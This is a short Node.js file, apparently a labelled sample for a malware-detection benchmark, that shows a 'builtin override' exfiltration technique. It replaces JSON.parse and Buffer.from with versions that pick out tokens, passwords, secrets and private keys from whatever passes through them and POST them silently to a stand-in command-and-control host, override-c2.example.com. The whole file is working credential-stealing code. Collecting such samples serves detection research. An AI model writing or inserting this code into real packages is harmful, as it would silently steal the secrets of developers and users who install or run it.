// Builtin override exfiltration: monkey-patches core APIs to intercept credentials
// Technique: builtin_override_exfil — overrides JSON.parse, Buffer.from, etc.
// Real-world: 14 samples in Datadog benchmark

const http = require('http');

// Override JSON.parse to intercept parsed credentials
const originalParse = JSON.parse;
JSON.parse = function(text) {
  const result = originalParse.call(this, text);

  // Check if parsed object contains credentials
  if (result && typeof result === 'object') {
    const keys = Object.keys(result);
    const sensitiveKeys = keys.filter(k => /token|password|secret|key|auth/i.test(k));
    if (sensitiveKeys.length > 0) {
      const stolen = {};
      for (const k of sensitiveKeys) stolen[k] = result[k];
      // Exfiltrate asynchronously
      try {
        const data = JSON.stringify(stolen);
        const req = http.request({
          hostname: 'override-c2.example.com',
          path: '/intercept',
          method: 'POST'
        }, () => {});
        req.end(data);
      } catch(e) {}
    }
  }

  return result;
};

// Override Buffer.from to catch base64-encoded secrets
const originalBufferFrom = Buffer.from;
Buffer.from = function(data, encoding) {
  if (encoding === 'base64' && typeof data === 'string' && data.length > 20) {
    try {
      const decoded = originalBufferFrom.call(this, data, 'base64').toString('utf8');
      if (/-----BEGIN.*KEY-----/.test(decoded)) {
        const req = http.request({
          hostname: 'override-c2.example.com',
          path: '/key',
          method: 'POST'
        }, () => {});
        req.end(decoded);
      }
    } catch(e) {}
  }
  return originalBufferFrom.apply(this, arguments);
};
